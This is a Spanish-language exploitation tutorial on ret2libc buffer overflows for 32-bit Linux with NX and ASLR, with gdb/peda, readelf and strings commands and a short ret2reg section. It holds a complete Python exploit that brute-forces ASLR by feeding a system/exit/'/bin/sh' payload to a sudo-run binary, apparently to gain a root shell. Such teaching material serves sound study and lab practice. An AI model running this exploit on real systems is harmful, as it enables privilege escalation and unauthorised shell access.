-----
- Tags: #teoria #practica #avanzado 
-----

# ¿ Que es un **ret2libc** ?

### Cada vez que nos encontramos con un programa en C que utiliza funciones típicas como printf, scanf, put, etc. todas estas son compiladas en un solo archivo que es la librería estándar de C o **libc**. 
### **Ret2libc** es una técnica que se basa en ejecutar código que no se encuentra en la pila sino en un sector de la memoria de libc, que es ejecutable. Es decir, el código utilizado para vulnerar el programa son funciones dentro de esta librería. 

---- 

# Buffer Overflow ret2libc x86 linux

### En esta ejemplo nos podríamos enfrentar a un binario vulnerable a buffer overflow en un sistema de 32 bits con **protecciones activas** (NX) y **ASLR activado** (Aleatoriedad den la disposición del espacio de direcciones, es decir un técnica de seguridad informática). 

### Como debugger usaremos la herramienta **gdb** (`sudo apt install gdb`) y lo fusionaremos como un script llamado [peda](https://github.com/longld/peda) (El cual cumple la misma función que *mona* en el Immunity Debugger). 

### El proceso para explotar el Buffer Overflow es lo mismo de siempre pero con algunas variaciones, en este caso el binario contara con una protección de tipo *NX* lo que nos impide capturar el registro **EIP** para apuntar al registro **ESP** donde en el **stack** estará nuestro **shellcode**, debido a que NX deriva de No Execution, y nos impide poder ejecutar nuestro shellcode almacenado en la pila. 

### Por lo que el proceso inicial es el mismo de siempre, primero tenemos que capturar el **offset**: 

```bash
# Ejecutamos el binario con el debugger gdb en modo "quiet"
gdb {binary} -q 
# Creamos un pattern para sobrescribir la pila y posteriormente sacar nuestro offset 
patter_create {size}
# Corremos el binario con el output "malicioso"
r {patter_created}
# Una vez sobrescrito los registros del sistema, calculamos el offset en base al valor almacenado en el registro EIP 
pattern offset $eip 
```

### Una vez con el offset, podríamos verificar si existen protecciones para este binario: 

```bash
# Una vez en gdb: 
checksec 
```

### En este ejemplo, contamos con un binario el cual tiene la protección **NX** activada, por lo que podemos empezar a pensar en un **ret2libc**, mediante la captura del registro **EIP**, este tiene que apuntar a la dirección de **system**, **exit** y el string **bin sh**.

### Pero para esto, debemos primeramente determinar si el **ASLR** esta habilitado: 

```bash
# Ver librerias compartidas del binario utilizado
ldd {binary}
#  Quedarnos con la dirección de memoria de la librería libc 
ldd {binary} | grep libc | awk 'NF{print $NF}' |  tr -d '()'
# Con esto, podríamos ver si ejecutamos 10, 20 u x veces esto comando, si las mismas cambian, en caso de que las direcciones cambien quiere decir que el ASLR esta habilitado: 
for i in $(seq 1 20); do ldd {binary} | grep libc | awk 'NF{print $NF}' | tr -d '()'; done 

# Otra manera de ver si el ASLR esta activado o no es: 
cat /proc/sys/kernel/randomize_va_space

```

### En caso de que el **ASLR** este desactivado, las direcciones de memoria de las funciones **system**, **exit** y la cadena **bin sh** se pueden sacar con *peda* desde el propio binario siendo estas estáticas: 

```bash
# Ver funciones disponibles
info functions 
# Meter breakpoint en la función main
b *main
# Ejecutar el programa con cualquier cosa para que cuando se ejecute se detenga en el comienzo debido al breakpoint
r 'AAAAAAAAAAAAAAAAAA'
# Ahora podemos realizar consultas...
# Mostrar la dirección de system 
p system 
# Mostrar la dirección de exit
p exit 
# Buscar la cadena "bin sh"
find "/bin/sh"
```

### Con dichas direcciónes podríamos realizar el Buffer Overflow ingresando la cantidad de caracteres necesarios según el **offset**, para posteriormente una vez controlado el registro **EIP** apuntar a la dirección de **system**, luego **exit** y **"/bin/sh"**. 

### Ahora, en caso de que el **ASLR** este activado, las direcciones de memoria cambian constantemente, esto complica la labor del atacante, PERO, en maquinas *x86* las direcciones no son muy largas, por lo que si ejecutamos 1000+ veces el comando, pueden existir coincidencias, es decir, que al ser direcciones al no ser muy grandes muchas veces  las direcciones coincidirán entre si, es decir, debemos hacer uso de la *fuerza bruta*.

### Ejecutando muchas veces el binario hasta que **libc** valga una dirección, una vez que coincida la dirección *base* de **libc** deberíamos calcular las distancias para llegar a las direcciones reales de **system**, **exit** y **"/bin/sh"**. 

### Como dijimos, en este caso deberíamos tomar una dirección random de la librería **libc** para que con esta junto a los **offset** de las funciones mencionadas, calcular el espacio real en memoria: 

```bash
# Capturar una dirección de memoria base de libc 
ldd {binary} | grep libc | awk 'NF{print $NF}' | tr -d '()' 
# Instalar binutils para poder usar una herramienta para sacar los offset de las funciones 
sudo apt install binutils
# Hacer uso de "readelf" para obtener información de binarios elf (Listar la tabla de simbolos )
ldd {binary}
# stdout: 
#      linux-gate.so.1 =>  (0xb774a000)
#	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7588000)
#	/lib/ld-linux.so.2 (0xb774b000)

# libc_path = /lib/i386-linux-gnu/libc.so.6) 
# Obtener offset de las funciones para sumarselos a la direccion base de libc
readelf -s {libc_path} | grep -E " system| exit"

# Obtener el offset de la cadena "/bin/sh"
strings -a -t x {libc_path} | grep "/bin/sh"
```

### De esta manera, una vez obtenidas las direcciones, simplemente deberíamos sumarlas a la dirección base de *libc* y tendríamos el **buffer overflow x86 linux ret2libc** 

#### exploit.py
```python
#!/usr/bin/python3

import subprocess, sys
from struct import pack

# Global Vars

# ret2libc ---> system + exit + /bin/sh

offset = 112
before_eip = b"A"*offset

# BASE_LIBC_ADDR:
# ldd {binary} | grep libc | awk 'NF{print $NF}' | tr -d '()'
# b75db000
base_libc_addr = 0xb75db000

# SYSTEM_ADDR_OFF & EXIT_ADDR_OFF:
# dobliuw@ubuntu:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E ' exit| system'
#   141: 0002e9e0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
#  1457: 0003adb0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0

# "BIN_SH_OFF:
# strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
# 15bb2b /bin/sh

# OFFSET DE LAS FUNCIONES:
system_addr_off = 0x0003adb0
exit_addr_off = 0x0002e9e0
bin_sh_off = 0x0015bb2b

# CALCULO DE LAS DIRECCIÓNES REALES:
system_addr = pack("<L", base_libc_addr + system_addr_off)
exit_addr = pack("<L", base_libc_addr + exit_addr_off)
bin_sh = pack("<L", base_libc_addr + bin_sh_off)

payload = before_eip + system_addr + exit_addr + bin_sh


def exploit():
	while True:
		result = subprocess.run(["sudo", "/usr/bin/custom", payload])
		if result.returncode == 0:
			print("\n\n\t[!] Quiting...\n\n")
			sys.exit(0)


if __name__ == "__main__":
	exploit()
```

----

# Ret2reg

### Adicionalmente, algo que de podría haber intentado en este caso, es un **ret2reg**, es decir **retornar a un registro**. Muchas veces, antes de realizar un *ret2libc* y realizar fuerza bruta en caso de que el sistema tenga el **ASLR** activado, podríamos intentar hacer uso de esta técnica la cual consiste en hacer que el registro *EIP* valga una dirección en memoria perteneciente al **opcode CALL EAX** , el cual así como JMP ESP es un OpCode el cual conduce el flujo del programa al registro ESP, el CALL EAX conduce el flujo del programa al registro **EAX**. 

### En algunos casos, al sobrescribir el búfer, se puede generar el caso en el que el inicio de nuestra cadena ingresada comience por el registro EAX, siendo este caso un buen momento para pensar en **ret2reg**, donde si contamos con la suerte de que el binario vulnerable contenga direcciónes de CALL EAX al estar alojadas en el propio binario, estas son *estáticas*. 

```bash
# Listar información de los registros con gbd
i r 
info registers
# Listar 16 palabras de un registro (Ej, eax) con gdb
x/16wx $eax 
```

#### Obtener el OpCode de **CALL EAX**: 
```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
# nasm > CALL EAX 
# 00000000  FFD0              call eax
```

#### Verificar si se aloja el OpCode **CALL EAX** en el binario: 
```bash
objdump -d {binary} | grep -i "FF D0"
```

